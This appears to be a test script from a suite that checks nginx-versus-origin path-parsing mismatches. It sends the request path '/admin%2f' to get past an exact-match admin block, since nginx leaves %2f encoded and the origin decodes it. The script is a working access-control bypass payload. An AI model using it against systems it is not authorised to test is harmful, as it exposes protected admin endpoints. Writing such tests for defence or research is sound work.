#!/usr/bin/env bash
# NGINX-ADMIN-ENCSLASH (CWE-436): nginx keeps %2f encoded, so /admin%2f misses the exact match; origin decodes it.
set -eu
. "$(dirname "$0")/_lib.sh"
leak "$NGINX" '/admin%2f'
